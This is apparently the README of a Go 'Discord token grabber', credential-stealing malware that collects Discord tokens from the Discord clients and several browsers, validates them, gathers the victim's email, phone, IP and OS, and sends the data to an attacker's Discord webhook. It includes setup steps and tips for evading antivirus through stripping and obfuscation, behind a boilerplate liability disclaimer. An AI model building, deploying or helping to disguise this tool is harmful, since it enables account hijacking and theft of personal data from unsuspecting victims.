# Discord Token Grabber Written in Go !

**For Windows please check out the [main](https://github.com/faceslog/discord-grabber-go/tree/main) branch** 

### Liability Disclaimer ⚠

The use of this software on any device that is not your own is highly discouraged. 
You need to obtain explicit permission from the owner if you intend to use this program in an environment you don't own, 
any illicit installation will likely be prosecuted by the jurisdiction the (ab)use occurs in.

Creators shall not be liable for any indirect, incidental, special, consequential or punitive damages, or any loss of profits
or revenue, whether incurred directly or indirectly, or any loss of data, use, goodwill, or other intangible losses,
resulting from:
- (i) your access to this resource and/or inability to access this resource
- (ii) any conduct or content of any third party referenced by this resource, including without limitation, any defamatory, offensive or illegal conduct or other users or third parties
- (iii) any content obtained from this resource

### Features: ⚙

- Send Informations via discord webhook
- Checks for Discord (Canary, PTB) tokens, Google Chrome, Brave Browser, Yandex Browser and Opera Browser
- Checks whether the token(s) is valid before sending it to avoid disabled tokens
- Check whether or not discord account has nitro
- Get Also: Email, Phone, Account display name, CPU Arch, OS, IP

<img src="./preview.png" alt="preview">

### Usage:

Create a Discord Webhook (https://support.discord.com/hc/articles/228383668-Intro-to-Webhooks) <br/>
Install Golang: https://golang.org/dl

Simply change these values in the `main.go` file:
```go
const (
	WebhookUrl       = "YOUR_WEBHOOK_URL"
	WebhookUsername  = "YOUR_WEBHOOK_NAME" // Webhook name
	Debug = false // For a console output
)
```

Then simply compile the `main.go` file !
```sh
# This command will keep debug info in your exe, and it will be detected by AVs 
# You can avoid this by using specific config flags that I won't provide here ! 
# with the correct config flags + some obfuscation the score on Virus Total is 0 
go build main.go
# By default, go build combines symbol and debug info with binary files. 
# However, you can remove the symbol and debug info with 
go build -ldflags "-s -w"
```
You should probably obfuscate or pack the executable file to avoid being detected by AVs. 
You can check out: https://github.com/burrowers/garble

You can also add more path to check for a token especially for Mac in the `func getAllTokens()` line ~205

### Contributing

Since it was my first go program there are things that can be improved for sure, don't hesitate to let me know 


